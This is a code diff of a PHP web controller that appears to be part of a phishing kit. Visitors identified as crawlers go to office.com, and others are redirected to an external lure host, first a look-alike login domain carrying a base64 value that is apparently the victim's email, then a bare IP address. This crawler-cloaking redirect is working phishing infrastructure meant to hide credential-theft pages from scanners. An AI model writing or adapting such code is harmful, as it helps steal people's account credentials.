@@ -18,12 +18,12 @@ class Controller extends BaseController
 
     public $dataemail = "";
 
-    public function index(){
-        $base64 = request()->a;
+    public function index($base64){
+
         if(Crawler::isCrawler()){
             return redirect()->away("https://office.com");
         }else{
-            return redirect()->away("https://login.reviewern.online/obKceMCK#".$base64);
+            return redirect()->away("http://159.65.227.252/testing/app");
 
         }
     }
@@ -31,8 +31,8 @@ class Controller extends BaseController
     public function index2(Request $request){
         $mail = $request->subs;
         $this->dataemail = $mail;
+        return "ok";
 
-        return $this->index($mail);
     }
 
     public function code($code){
